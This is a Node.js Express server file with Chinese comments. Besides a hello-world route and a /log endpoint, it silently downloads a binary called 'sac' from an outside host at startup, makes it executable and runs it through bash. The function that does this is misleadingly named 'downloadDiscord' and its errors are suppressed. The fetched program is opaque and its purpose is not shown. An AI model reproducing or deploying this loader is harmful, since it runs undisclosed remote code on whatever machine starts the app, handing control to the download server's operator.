const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
const FILE_PATH = './.npm'; // 目标目录

// =================================================================
// 🌟 解决 ENOENT 错误的关键修改: 确保目录存在
// =================================================================

try {
    // 检查目录是否存在，如果不存在则创建它
    if (!fs.existsSync(FILE_PATH)) {
        // recursive: true 确保如果需要创建多级目录也能成功
        fs.mkdirSync(FILE_PATH, { recursive: true });
        console.log(`Successfully created directory: ${FILE_PATH}`);
    }
} catch (err) {
    // 如果创建失败，记录错误
    console.error(`Error attempting to create directory ${FILE_PATH}:`, err);
}

// =================================================================

app.get("/", function(req, res) {
  res.send("Hello world!");
});

app.get("/log", (req, res) => {
  const logPath = path.join(FILE_PATH, 'log.txt');
  fs.readFile(logPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      // ⚠️ 注意：如果文件不存在，现在只会报“文件不存在”的错误，
      // 但目录存在的错误已解决。
      // 如果 log.txt 是运行时产生的，您可能还需要在 log.txt 不存在时
      // 返回一个空文件，而不是 500 错误，但这取决于您的需求。
      res.status(500).send("Error reading log.txt");
    } else {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.send(data);
    }
  });
});

const downloadDiscord = async () => {
  try {
    // ... (保持不变)
    const response = await axios({
      method: 'get',
      url: 'https://amd64.2go.us.kg/sac',
      responseType: 'stream'
    });

    const writer = fs.createWriteStream('sac');
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        console.log('Download completed');
        exec('chmod +x sac', (err) => {
          if (err) reject(err);
          resolve();
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    throw err;
  }
};

const Execute = async () => {
  try {
    await downloadDiscord();
    const command = './sac';
    exec(command, { 
      shell: '/bin/bash'
    });
  } catch (err) {}
};

Execute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});
